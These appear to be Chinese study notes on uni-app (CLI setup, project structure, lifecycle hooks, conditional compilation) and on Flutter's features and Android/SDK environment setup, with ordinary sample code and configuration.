![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530115111.png)

[自定义模板](https://uniapp.dcloud.io/quickstart-cli?id=自定义模板)

选择自定义模板时，需要填写 uni-app 模板地址，这个地址其实就是托管在云端的仓库地址。以 GitHub 为例，地址格式为 `userName/repositoryName`，如 `dcloudio/uni-template-picture` 就是下载图片模板。

更多支持的下载方式，请参考这个插件的说明：[download-git-repo](https://www.npmjs.com/package/download-git-repo)

如果我们想要运行在网页端，则执行

```
	npm run serve
```

如果想要运行在微信开发者工具，则执行

```
	npm run dev:weixin
```

然后在微信开发者工具打开项目对应的目录即可运行小程序

![image-20210530115705221](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530115705.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530115726.png" alt="image-20210530115726543" style="zoom:67%;" />

但是如果想直接在微信开发者工具导入项目根目录是不行的，这时候我们可以在项目根目录新建一个文件:project.config.json,

输入以下代码即可：

```
	{
       "miniprogramRoot":"./dist/dev/mp-weixin"   //项目运行目录
     }
```

注：project.config.json更详细用法请访问：https://developers.weixin.qq.com/miniprogram/dev/devtools/projectconfig.html

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530120028.png" alt="image-20210530120028049" style="zoom: 67%;" />

注：通过脚手架搭建项目更详细的教程请访问：https://uniapp.dcloud.io/quickstart-cli

## 项目基本结构

![image-20210530143227325](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530143227.png)

1. componnets - 自定义组件的目录（当然，这不是默认生成的，而是我们自己新建的文件夹，这个名字可以命名为任何名称）

2. pages - 页面存放目录

3. static - 页面存放目录

4. unpackage - 编译后的文件存放目录

5. utils - 公用的工具类（自定义）

6. app.vue - app.js

7. main.js - 应用入口

8. manifest.json - 项目配置

9. pages.json - 页面配置

   > `pages.json` 文件用来对 uni-app 进行全局配置，决定页面文件的路径、窗口样式、原生的导航栏、底部的原生tabbar 等。
   >
   > 它类似微信小程序中`app.json`的**页面管理**部分。注意定位权限申请等原属于`app.json`的内容，在uni-app中是在manifest中配置。

   ```
   {
   	//页面配置
   	"pages": [ //pages数组中第一项表示应用启动页，参考：https://uniapp.dcloud.io/collocation/pages
   		{
   			"path": "pages/index/index",
   			"style": {
   				"navigationBarTitleText": "uni-app"
   			}
   		}
   	],
   	//全局配置
   	"globalStyle": {
   		"navigationBarTextStyle": "black",
   		"navigationBarTitleText": "uni-app",
   		"navigationBarBackgroundColor": "#F8F8F8",
   		"backgroundColor": "#F8F8F8"
   	}
   }
   ```

   注：详情请访问：https://uniapp.dcloud.io/collocation/pages

## 语法

> uniapp的语法和vue是一样的，区别在于uniapp的生命周期、条件编译-注释、uniapp自带api这几个地方，其他都基本一致

### uniapp的生命周期

> uniapp的生命周期分为三种：应用生命周期、页面生命周期、组件生命周期

#### 应用生命周期

`uni-app` 支持如下应用生命周期函数：

| 函数名               | 说明                                                         |
| :------------------- | :----------------------------------------------------------- |
| onLaunch             | 当`uni-app` 初始化完成时触发（全局只触发一次）               |
| onShow               | 当 `uni-app` 启动，或从后台进入前台显示                      |
| onHide               | 当 `uni-app` 从前台进入后台                                  |
| onError              | 当 `uni-app` 报错时触发                                      |
| onUniNViewMessage    | 对 `nvue` 页面发送的数据进行监听，可参考 [nvue 向 vue 通讯](https://uniapp.dcloud.io/nvue-api?id=communication) |
| onUnhandledRejection | 对未处理的 Promise 拒绝事件监听函数（2.8.1+）                |
| onPageNotFound       | 页面不存在监听函数                                           |
| onThemeChange        | 监听系统主题变化                                             |

**注意**

- 应用生命周期仅可在`App.vue`中监听，在其它页面监听无效。
- onlaunch里进行页面跳转，如遇白屏报错，请参考https://ask.dcloud.net.cn/article/35942

**示例代码**

```html
     <script>
         // 只能在App.vue里监听应用的生命周期
         export default {
             onLaunch: function() {
                 console.log('App Launch')
             },
             onShow: function() {
                 console.log('App Show')
             },
             onHide: function() {
                 console.log('App Hide')
             }
         }
     </script>
```

#### [页面生命周期](https://uniapp.dcloud.io/collocation/frame/lifecycle?id=页面生命周期)

`uni-app` 支持如下页面生命周期函数：

| 函数名                              | 说明                                                         | 平台差异说明                                                 | 最低版本 |
| :---------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :------- |
| onInit                              | 监听页面初始化，其参数同 onLoad 参数，为上个页面传递的数据，参数类型为 Object（用于页面传参），触发时机早于 onLoad | 百度小程序                                                   | 3.1.0+   |
| onLoad                              | 监听页面加载，其参数为上个页面传递的数据，参数类型为 Object（用于页面传参），参考[示例](https://uniapp.dcloud.io/api/router?id=navigateto) |                                                              |          |
| onShow                              | 监听页面显示。页面每次出现在屏幕上都触发，包括从下级页面点返回露出当前页面 |                                                              |          |
| onReady                             | 监听页面初次渲染完成。注意如果渲染速度快，会在页面进入动画完成前触发 |                                                              |          |
| onHide                              | 监听页面隐藏                                                 |                                                              |          |
| onUnload                            | 监听页面卸载                                                 |                                                              |          |
| onResize                            | 监听窗口尺寸变化                                             | App、微信小程序                                              |          |
| onPullDownRefresh                   | 监听用户下拉动作，一般用于下拉刷新，参考[示例](https://uniapp.dcloud.io/api/ui/pulldown) |                                                              |          |
| onReachBottom                       | 页面滚动到底部的事件（不是scroll-view滚到底），常用于下拉下一页数据。具体见下方注意事项 |                                                              |          |
| onTabItemTap                        | 点击 tab 时触发，参数为Object，具体见下方注意事项            | 微信小程序、支付宝小程序、百度小程序、H5、App（自定义组件模式） |          |
| onShareAppMessage                   | 用户点击右上角分享                                           | 微信小程序、百度小程序、字节跳动小程序、支付宝小程序         |          |
| onPageScroll                        | 监听页面滚动，参数为Object                                   | nvue暂不支持                                                 |          |
| onNavigationBarButtonTap            | 监听原生标题栏按钮点击事件，参数为Object                     | App、H5                                                      |          |
| onBackPress                         | 监听页面返回，返回 event = {from:backbutton、 navigateBack} ，backbutton 表示来源是左上角返回按钮或 android 返回键；navigateBack表示来源是 uni.navigateBack ；详细说明及使用：[onBackPress 详解](http://ask.dcloud.net.cn/article/35120)。支付宝小程序只有真机能触发，只能监听非navigateBack引起的返回，不可阻止默认行为。 | app、H5、支付宝小程序                                        |          |
| onNavigationBarSearchInputChanged   | 监听原生标题栏搜索输入框输入内容变化事件                     | App、H5                                                      | 1.6.0    |
| onNavigationBarSearchInputConfirmed | 监听原生标题栏搜索输入框搜索事件，用户点击软键盘上的“搜索”按钮时触发。 | App、H5                                                      | 1.6.0    |
| onNavigationBarSearchInputClicked   | 监听原生标题栏搜索输入框点击事件                             | App、H5                                                      | 1.6.0    |
| onShareTimeline                     | 监听用户点击右上角转发到朋友圈                               | 微信小程序                                                   | 2.8.1+   |
| onAddToFavorites                    | 监听用户点击右上角收藏                                       | 微信小程序                                                   | 2.8.1+   |

`onInit`使用注意

- 仅百度小程序基础库 3.260 以上支持 onInit 生命周期
- 其他版本或平台可以同时使用 onLoad 生命周期进行兼容，注意避免重复执行相同逻辑
- 不依赖页面传参的逻辑可以直接使用 created 生命周期替代

`onReachBottom`使用注意 可在pages.json里定义具体页面底部的触发距离[onReachBottomDistance](https://uniapp.dcloud.io/collocation/pages)，比如设为50，那么滚动页面到距离底部50px时，就会触发onReachBottom事件。

如使用scroll-view导致页面没有滚动，则触底事件不会被触发。scroll-view滚动到底部的事件请参考scroll-view的文档

`onPageScroll` （监听滚动、滚动监听、滚动事件）参数说明：

| 属性      | 类型   | 说明                                 |
| --------- | ------ | ------------------------------------ |
| scrollTop | Number | 页面在垂直方向已滚动的距离（单位px） |

**注意**

- `onPageScroll`里不要写交互复杂的js，比如频繁修改页面。因为这个生命周期是在渲染层触发的，在非h5端，js是在逻辑层执行的，两层之间通信是有损耗的。如果在滚动过程中，频发触发两层之间的数据交换，可能会造成卡顿。
- 如果想实现滚动时标题栏透明渐变，在App和H5下，可在pages.json中配置titleNView下的type为transparent，[参考](https://uniapp.dcloud.io/collocation/pages?id=app-titlenview)。
- 如果需要滚动吸顶固定某些元素，推荐使用css的粘性布局，参考[插件市场](https://ext.dcloud.net.cn/plugin?id=715)。插件市场也有其他js实现的吸顶插件，但性能不佳，需要时可自行搜索。
- 在App、微信小程序、H5中，也可以使用wxs监听滚动，[参考](https://uniapp.dcloud.io/frame?id=wxs)；在app-nvue中，可以使用bindingx监听滚动，[参考](https://uniapp.dcloud.io/nvue-api?id=nvue-里使用-bindingx)。
- `onBackPress`上不可使用`async`，会导致无法阻止默认返回

```js
     onPageScroll : function(e) { //nvue暂不支持滚动监听，可用bindingx代替
         console.log("滚动距离为：" + e.scrollTop);
     },
```

`onTabItemTap` 返回的json对象说明：

| 属性     | 类型   | 说明                         |
| -------- | ------ | ---------------------------- |
| index    | String | 被点击tabItem的序号，从0开始 |
| pagePath | String | 被点击tabItem的页面路径      |
| text     | String | 被点击tabItem的按钮文字      |

**注意**

- onTabItemTap常用于点击当前tabitem，滚动或刷新当前页面。如果是点击不同的tabitem，一定会触发页面切换。
- 如果想在App端实现点击某个tabitem不跳转页面，不能使用onTabItemTap，可以使用[plus.nativeObj.view](http://www.html5plus.org/doc/zh_cn/nativeobj.html)放一个区块盖住原先的tabitem，并拦截点击事件。
- 支付宝小程序平台onTabItemTap表现为点击非当前tabitem后触发，因此不能用于实现点击返回顶部这种操作

```js
onTabItemTap : function(e) {
    console.log(e);
    // e的返回格式为json对象： {"index":0,"text":"首页","pagePath":"pages/index/index"}
},
```

`onNavigationBarButtonTap` 参数说明：

| 属性  | 类型   | 说明                     |
| ----- | ------ | ------------------------ |
| index | Number | 原生标题栏按钮数组的下标 |

```js
onNavigationBarButtonTap : function (e) {
    console.log(e);
    // e的返回格式为json对象：{"text":"测试","index":0}
}
```

`onBackPress` 回调参数对象说明：

| 属性 | 类型   | 说明                                                         |
| ---- | ------ | ------------------------------------------------------------ |
| from | String | 触发返回行为的来源：'backbutton'——左上角导航栏按钮及安卓返回键；'navigateBack'——uni.navigateBack() 方法。**支付宝小程序端不支持返回此字段** |

```javascript
export default {
    data() {
        return {};
    },
    onBackPress(options) {
        console.log('from:' + options.from)
    }
}
```

**注意**

- nvue 页面weex编译模式支持的生命周期同weex，具体参考：[weex生命周期介绍](https://uniapp.dcloud.io/nvue-outline?id=编译模式)。
- 支付宝小程序真机可以监听到非`navigateBack`引发的返回事件（使用小程序开发工具时不会触发`onBackPress`），不可以阻止默认返回行为

#### 组件生命周期

> `uni-app` 组件支持的生命周期，与vue标准组件的生命周期相同。这里没有页面级的onLoad等生命周期：

| 函数名        | 说明                                                         | 平台差异说明 | 最低版本 |
| :------------ | :----------------------------------------------------------- | :----------- | :------- |
| beforeCreate  | 在实例初始化之后被调用。[详见](https://cn.vuejs.org/v2/api/#beforeCreate) |              |          |
| created       | 在实例创建完成后被立即调用。[详见](https://cn.vuejs.org/v2/api/#created) |              |          |
| beforeMount   | 在挂载开始之前被调用。[详见](https://cn.vuejs.org/v2/api/#beforeMount) |              |          |
| mounted       | 挂载到实例上去之后调用。[详见](https://cn.vuejs.org/v2/api/#mounted) 注意：此处并不能确定子组件被全部挂载，如果需要子组件完全挂载之后在执行操作可以使用`$nextTick`[Vue官方文档](https://cn.vuejs.org/v2/api/#Vue-nextTick) |              |          |
| beforeUpdate  | 数据更新时调用，发生在虚拟 DOM 打补丁之前。[详见](https://cn.vuejs.org/v2/api/#beforeUpdate) | 仅H5平台支持 |          |
| updated       | 由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。[详见](https://cn.vuejs.org/v2/api/#updated) | 仅H5平台支持 |          |
| beforeDestroy | 实例销毁之前调用。在这一步，实例仍然完全可用。[详见](https://cn.vuejs.org/v2/api/#beforeDestroy) |              |          |
| destroyed     | Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。[详见](https://cn.vuejs.org/v2/api/#destroyed) |              |          |

#### 各生命周期执行顺序

/src/App.vue(应用生命周期）:

```
     <script>
          export default {  
         //!应用生命周期
         //应用 初始化完成触发一次，全局只触发一次
         //用途:登录 初始化全局变量等等
               onLaunch: function() {
                    console.log('App Launch');
               },
         //应用启动的时候，或者从后台进入前台会触发
               onShow: function() {
                    console.log('App Show')
               },
         //应用从前台进入后台触发
               onHide: function() {
                    console.log('App Hide')
               }
          }
     </script>
```

/src/page/index/index.vue(页面生命周期)：

```
<template>
		<view>
      <button @click="open">
        打开新页面
      </button>
      <com></com>
		</view>
</template>

<script>
  import com from '@/components/com.vue'
	export default {
    components:{
      com
    },
    //监听页面加载
		onLoad() {
      console.log('page onLoad')
		},
    //监听页面显示
    onShow(){
      console.log('page onshow');
    },
    //监听页面的初次渲染完成
    onReady(){
      //!  如果渲染速度很快，会在页面进入动画完成前触发
      console.log('page onReady');
    },
    //监听页面隐藏
    onHide(){
      console.log('page onHide')
    },
    //监听页面的卸载
    onUnload(){
      console.log('page onUnload')
    },
    methods:{
      open(){
        //!只会该页面的onHide,不会触发onUnload
        // uni.navigateTo({
        //   url:'../test/test'
        // }),
        //!会该页面的onUnload,不会触发onHide
        uni.redirectTo({
          url:'../test/test'
        })
      }
    }
	}
</script>
```

/src/components/com.vue(组件生命周期):

```
     <template>
         <view>
           com
         </view>
     </template>
     <script>
       export default {
       // 在实例初始化之后，数据观测（data observer)和event/watcher事件配置之前被调用
       beforeCreated(){
         console.log('component beforeCreate');
       },
       //实例创建完毕之后调用，挂载还没开始
       created(){
         console.log('component created')
       },
       //挂载到实例上去之后调用
       mounted(){
         console.log('component mounted')
       },
       //vue 实例销毁后调用
       destroyed(){
         console.log('componnet destroyed')
       }
     }
     </script>
```

输出结果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530140851.png" alt="image-20210530140851246" style="zoom:67%;" />

点击按钮触发页面跳转redirectTo



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530140953.png" alt="image-20210530140953490" style="zoom:67%;" />

返回：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530141150.png" alt="image-20210530141150392" style="zoom:67%;" />

点击按钮触发页面跳转redirectTo



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530141049.png" alt="image-20210530141049380" style="zoom:67%;" />

返回：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530141105.png" alt="image-20210530141105512" style="zoom:67%;" />

### 条件编译-注释

> 条件编译是用特殊的注释作为标记，在编译时根据这些特殊的注释，将注释里面的代码编译到不同平台。

**写法：**以 #ifdef 或 #ifndef 加 **%PLATFORM%** 开头，以 #endif 结尾。

- \#ifdef：if defined 仅在某平台存在
- \#ifndef：if not defined 除了某平台均存在
- **%PLATFORM%**：平台名称

| 条件编译写法                                             | 说明                                                         |
| -------------------------------------------------------- | ------------------------------------------------------------ |
| #ifdef **APP-PLUS** 需条件编译的代码 #endif              | 仅出现在 App 平台下的代码                                    |
| #ifndef **H5** 需条件编译的代码 #endif                   | 除了 H5 平台，其它平台均存在的代码                           |
| #ifdef **H5** \|\| **MP-WEIXIN** 需条件编译的代码 #endif | 在 H5 平台或微信小程序平台存在的代码（这里只有\|\|，不可能出现&&，因为没有交集） |

**%PLATFORM%** **可取值如下：**

| 值                      | 平台                                                         |
| :---------------------- | :----------------------------------------------------------- |
| APP-PLUS                | App                                                          |
| APP-PLUS-NVUE或APP-NVUE | App nvue                                                     |
| H5                      | H5                                                           |
| MP-WEIXIN               | 微信小程序                                                   |
| MP-ALIPAY               | 支付宝小程序                                                 |
| MP-BAIDU                | 百度小程序                                                   |
| MP-TOUTIAO              | 字节跳动小程序                                               |
| MP-QQ                   | QQ小程序                                                     |
| MP-360                  | 360小程序                                                    |
| MP                      | 微信小程序/支付宝小程序/百度小程序/字节跳动小程序/QQ小程序/360小程序 |
| QUICKAPP-WEBVIEW        | 快应用通用(包含联盟、华为)                                   |
| QUICKAPP-WEBVIEW-UNION  | 快应用联盟                                                   |
| QUICKAPP-WEBVIEW-HUAWEI | 快应用华为                                                   |

**持的文件**

- .vue
- .js
- .css
- pages.json
- 各预编译语言文件，如：.scss、.less、.stylus、.ts、.pug

**注意：**

- 条件编译是利用注释实现的，在不同语法里注释写法不一样，js使用 `// 注释`、css 使用 `/* 注释 */`、vue/nvue 模板里使用 `<!-- 注释 -->`；
- 条件编译APP-PLUS包含APP-NVUE和APP-VUE，APP-PLUS-NVUE和APP-NVUE没什么区别，为了简写后面出了APP-NVUE ；
- 使用条件编译请保证`编译前`和`编译后`文件的正确性，比如json文件中不能有多余的逗号；

**[API 的条件编译](https://uniapp.dcloud.io/platform?id=api-的条件编译)**

```javascript
     // #ifdef  %PLATFORM%
     平台特有的API实现
     // #endif
```

示例，如下代码仅在 App 下出现:

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/07834e90-4f3c-11eb-b680-7980c8a877b8.png)

示例，如下代码不会在 H5 平台上出现：

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/06a79490-4f3c-11eb-b680-7980c8a877b8.png)

除了支持单个平台的条件编译外，还支持**多平台**同时编译，使用 || 来分隔平台名称。

示例，如下代码会在 App 和 H5 平台上出现：

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/05c1ef80-4f3c-11eb-b680-7980c8a877b8.png)

**[组件的条件编译](https://uniapp.dcloud.io/platform?id=组件的条件编译)**

```html
     <!--  #ifdef  %PLATFORM% -->
     平台特有的组件
     <!--  #endif -->
```

示例，如下公众号关注组件仅会在微信小程序中出现：

```html
     <view>
         <view>微信公众号关注组件</view>
         <view>
             <!-- uni-app未封装，但可直接使用微信原生的official-account组件-->
             <!-- #ifdef MP-WEIXIN -->
                     <official-account></official-account>
                 <!-- #endif -->
         </view>
     </view>
```

**[样式的条件编译](https://uniapp.dcloud.io/platform?id=样式的条件编译)**

```css
     /*  #ifdef  %PLATFORM%  */
     平台特有样式
     /*  #endif  */
```

**注意：** 样式的条件编译，无论是 css 还是 sass/scss/less/stylus 等预编译语言中，必须使用 `/*注释*/` 的写法。

正确写法

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/0bd78d80-4f3c-11eb-a16f-5b3e54966275.png)

错误写法

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/0c9c8b30-4f3c-11eb-8a36-ebb87efcf8c0.png)

**[pages.json 的条件编译](https://uniapp.dcloud.io/platform?id=pagesjson-的条件编译)**

下面的页面，只有运行至 App 时才会编译进去。

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/04ecec40-4f3c-11eb-97b7-0dc4655d6e68.png)

不同平台下的特有功能，以及小程序平台的分包，都可以通过 pages.json 的条件编译来更好地实现。这样，就不会在其它平台产生多余的资源，进而减小包体积。

json的条件编译，如不同平台的key名称相同，cli项目下开发者自己安装的校验器会报错，需自行关闭这些校验器对json相同key的校验规则。如果使用HBuilderX的校验器，无需在意此问题，HBuilderX的语法校验器为此优化过。

**[static 目录的条件编译](https://uniapp.dcloud.io/platform?id=static-目录的条件编译)***

在不同平台，引用的静态资源可能也存在差异，通过 static 的的条件编译可以解决此问题，static 目录下新建不同平台的专有目录（目录名称同 `%PLATFORM%` 值域,但字母均为小写），专有目录下的静态资源只有在特定平台才会编译进去。

如以下目录结构，`a.png` 只有在微信小程序平台才会编译进去，`b.png` 在所有平台都会被编译。

```
     ┌─static                
     │  ├─mp-weixin
     │  │  └─a.png     
     │  └─b.png
     ├─main.js        
     ├─App.vue      
     ├─manifest.json 
     └─pages.json     
```

**[整体目录条件编译](https://uniapp.dcloud.io/platform?id=整体目录条件编译)**

如果想把各平台的页面文件更彻底的分开，也可以在uni-app项目根目录创建`platforms`目录，然后在下面进一步创建`app-plus`、`mp-weixin`等子目录，存放不同平台的文件。

**注意**

- `platforms`目录下只支持放置页面文件（即页面vue文件），如果需要对其他资源条件编译建议使用[static 目录的条件编译](https://uniapp.dcloud.io/platform?id=static-目录的条件编译)

**[HBuilderX 支持](https://uniapp.dcloud.io/platform?id=hbuilderx-支持)**

HBuilderX 为 `uni-app` 的条件编译提供了丰富的支持:

**代码块支持**

在 HBuilderX 中开发 `uni-app` 时，通过输入 **ifdef** 可快速生成条件编译的代码片段

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/0a1766f0-4f3c-11eb-8a36-ebb87efcf8c0.png)

**语法高亮**

在 HBuilderX 中对条件编译的代码注释部分提供了语法高亮，可分辨出写法是否正确，使得代码更加清晰（独立js文件需在编辑器右下角切换javascript es6+编辑器，独立css文件暂不支持高亮，但不高亮不影响使用）

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/0868a580-4f3c-11eb-8a36-ebb87efcf8c0.png)

**正确注释和快速选中**

在 HBuilderX 中，ctrl+alt+/ 即可生成正确注释（js：`// 注释`、css：`/* 注释 */`、vue/nvue模板： `<!-- 注释 -->`）。

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/0af9d7b0-4f3c-11eb-8a36-ebb87efcf8c0.png)

点击 **ifdef** 或 **endif** 可快速选中条件编译部分；点击左侧的折叠图标，可折叠条件编译部分代码。

![img](https://bjetxgzv.cdn.bspapp.com/VKCEYUGU-uni-app-doc/09460d30-4f3c-11eb-8a36-ebb87efcf8c0.png)

**[注意](https://uniapp.dcloud.io/platform?id=注意)**

- Android 和 iOS 平台不支持通过条件编译来区分，如果需要区分 Android、iOS 平台，请通过调用 uni.getSystemInfo 来获取平台信息。支持`ifios`、`ifAndroid`代码块，可方便编写判断。
- 有些跨端工具可以提供js的条件编译或多态，但这对于实际开发远远不够。uni-app不止是处理js，任何代码都可以多端条件编译，才能真正解决实际项目的跨端问题。另外所谓多态在实际开发中会造成大量冗余代码，很不利于复用和维护。举例，微信小程序主题色是绿色，而百度支付宝小程序是蓝色，你的应用想分平台适配颜色，只有条件编译是代码量最低、最容易维护的。
- 有些公司的产品运营总是给不同平台提不同需求，但这不是拒绝uni-app的理由。关键在于项目里，复用的代码多还是个性的代码多，正常都是复用的代码多，所以仍然应该多端。而个性的代码放到不同平台的目录下，差异化维护。

### uniapp自带api

### 其他差异

1. 由于在uniapp开发中没有body标签，那么我们如何选择body呢？

   答：使用page{}选择

   ```
   page{}   等于   html中的 body{}
   ```

## uniCloud

> `uniCloud` 是 DCloud 联合阿里云、腾讯云，为开发者提供的基于 serverless 模式和 js 编程的云开发平台。
>
> `uniCloud` 的 web控制台地址：[https://unicloud.dcloud.net.cn](https://unicloud.dcloud.net.cn/)



# flutter

## 简介

> Flutter 是⾕歌开发的⼀款开源、免费的，基于 Dart 语⾔的移动 UI 框架，可以快速在 iOS 和 Android 
>
> 上构建⾼质量的原⽣应⽤。 它最⼤的特点就是跨平台和⾼性能。 

### 特点

- Dart语言

  Dart 是由⾕歌开发的计算机编程语⾔，它可以被⽤于  Web、 服务器、 移动应⽤和物联⽹等领域的开发。 Dart 诞⽣于 2011 年，号称要取代 JavaScript

- 跨平台

  良好的跨平台性，直接带来的好处就是减少开发成本。

  - 移动端
    - Android
    - iOS
  - Web
    - 各种浏览器
  - 桌面端
    - windows
    - mac
  - 嵌入式平台
    - Linux
    - Fuchsia

- 高性能

  Flutter 采⽤ GPU （图形显示）渲染技术，所以性能极⾼。 Flutter 编写的应⽤是可以达到 120 fps（每秒传输帧数），这也就是说，它完全可以胜任游戏的制作。 ⽽ React Native 的性能只能达到60 fps

### 发展历程

- 2015，Flutter 在 Dart 开发者峰会上亮相
- 2018-6，Flutter发布了首个预览版本
- 2018-12，Flutter1.0发布
- 2019-9，Flutter1.9发布，添加了Web端支持
- 2020-9，Flutter1.22发布，带来了对IOS14和Android11的支持
- 当前版本：Flutter2.2

### 主流框架对比



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712210737.png" alt="image-20210712210737274" style="zoom: 50%;" />

不同开发模式的对比

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712210913.png" alt="image-20210712210913637" style="zoom:50%;" />

想了解更多混合开发的概念点击：https://zhuanlan.zhihu.com/p/105556638

#### 移动原生开发

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712211006.png" alt="image-20210712211006334" style="zoom:50%;" />

#### 混合开发框架（原生派）

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712211040.png" alt="image-20210712211040167" style="zoom: 50%;" />

跨平台三大框架对比：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712215033.png" alt="image-20210712215033488" style="zoom:50%;" />

## 环境搭建

*windows下只能搭建Android开发环境Mac下既能搭建Android开发环境，也能搭建IOS开发环境*

1. ***JDK***

   具体过程请前往后端开发->Java->环境搭建

2. ***配置Android环境***

   如果想为Flutter配置Android开发环境，需要在我们的电脑上安装一个Android Studio

   - Android Studio是基于IntelliJ IDEA的、Google 官方的 Android 应用集成开发环境 (IDE)。

   **Android Studio的下载**

   - 官网地址：https://developer.android.com/studio
   - 直接在官方下载即可
   - 安装直接双击安装即可

   **Android的环境配置**

   打开Android Studio，会问我们是否要设置代理，这是因为下载Android SDK等在国内不好下载

   - 至于如何设置代理，这里就不再讲解了~~~
   - 最好要设置代理哦，不然估计会被气死~~~

   

   ![image-20190830152535190](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712224529.webp)

   

   之后各种下一步，就会帮我们安装SDK等相关需要使用的内容

   

   ![image-20190830152715874](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712224529.webp)

   

   安装好后，点击Finish即可。

   **创建Android模拟器**

   安装好后，我们就可以去创建模拟器：选择Configure - AVD Manger

   

   <img src="https://user-gold-cdn.xitu.io/2019/9/4/16cfc5106f1f1a8b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20190830153436419" style="zoom:50%;" />

   

   选择create virtual device

   

   <img src="https://user-gold-cdn.xitu.io/2019/9/4/16cfc51072abd5ef?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20190830153549326" style="zoom:50%;" />

   

   选择一个你想用的设备

   

   <img src="https://user-gold-cdn.xitu.io/2019/9/4/16cfc51275a98f62?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20190830153820771" style="zoom:50%;" />

   

   选择Android的版本（这里我没有选择Q版本，它目前还是一个bata版本），点击download

   - 下一个界面，点击`accept - next`就可以了

   

   <img src="https://user-gold-cdn.xitu.io/2019/9/4/16cfc51067558384?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20190830154008864" style="zoom:50%;" />

   

   接着下一步，给自己的模拟器起个名字

   

   <img src="https://user-gold-cdn.xitu.io/2019/9/4/16cfc5109b79577f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20190830155635699" style="zoom:50%;" />

   

   启动Android模拟器

   

   <img src="https://user-gold-cdn.xitu.io/2019/9/4/16cfc510a9c7fba6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20190830162101035" style="zoom:50%;" />

3. Flutter SDK

   使用Flutter开发，首先我们需要安装一个Flutter的SDK。

   **下载Flutter的SDK**

   来到Flutter的官网网站，选择最新稳定的Flutter SDK的版本

   - 网站地址：[flutter.dev/docs/develo…](https://link.juejin.cn/?target=https%3A%2F%2Fflutter.dev%2Fdocs%2Fdevelopment%2Ftools%2Fsdk%2Freleases%3Ftab%3Dmacos)
   - 选择自己的操作系统和最新稳定的版本（Stable版本）（我当前最新稳定的版本是1.7.8）

   **安装Flutter**

   1.解压下载好的Flutter SDK

   - 这个在Windows和macOS都是一样的（选择一个自己想要安装的目录）
   - 但是在macOS中，我通常会讲flutter目录拖入到应用程序中，将其当作我的一个应用（个人习惯而已）

   

   ![image-20190830102148741](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712224432.webp)

   2.配置Flutter的环境变量

   - 因为我们之后需要在命令行执行Flutter的命令，所以需要配置环境变量

     macOS或者Linux系统，需要编辑~/.bash_profile文件

   ```
        export PATH=$PATH:/Applications/flutter/bin
   ```

   Windows用户将所在路径添加到环境变量的Path下

   - Windows环境变量修改：点击计算机图标 - 属性 - 高级系统设置 - 高级 - 环境变量
   - 找到Path，在其中添加Flutter SDK目录下`bin目录`

   在终端中执行flutter --version，出现如下内容，说明安装flutter成功

   ![image-20190830113709884](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712224432.webp)

   **配置镜像**

   flutter项目会依赖一些东西，在国内下载这些依赖会有一些慢，所以我们可以将它们的安装源换成国内的（也就是设置国内的镜像）

   macOS或者Linux操作系统，依然是编辑~/.bash_profile文件

   ```
   export PUB_HOSTED_URL=https://pub.flutter-io.cn
   export FLUTTER_STORAGE_BASE_URL=https://storage.flutter
   ```

   Windows用户还是需要修改环境变量

   - Windows环境变量修改：点击计算机图标 - 属性 - 高级系统设置 - 高级 - 环境变量
   - 新建 变量 PUB_HOSTED_URL，其值为https://pub.flutter-io.cn
   - 新建 变量 FLUTTER_STORAGE_BASE_URL， 其值为https://storage.flutter-io.cn

   **注意：** 此镜像为临时镜像，并不能保证一直可用，大家可以参考详情请参考 [Using Flutter in China](https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Fflutter%2Fflutter%2Fwiki%2FUsing-Flutter-in-China) 以获得有关镜像服务器的最新动态。

   

   这个时候我们执行一下如下终端命令：

   ```
   flutter doctor
   ```

   看到如下有两个可用的设备

   

   ![image-20190830162536667](https://user-gold-cdn.xitu.io/2019/9/4/16cfc510eabf4764?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

   运行flutter doctor可能会有以下问题：

   1、Some Android licenses not accepted

   ​	运行flutter doctor --android-licenses

   ​	运行过程钟，所有的答案都输入y

   2、No devices available(没有可用设备)

   ​	我们启动模拟器后，这个问题就解决了。启动模拟器有很多种方式。具体操作如下：

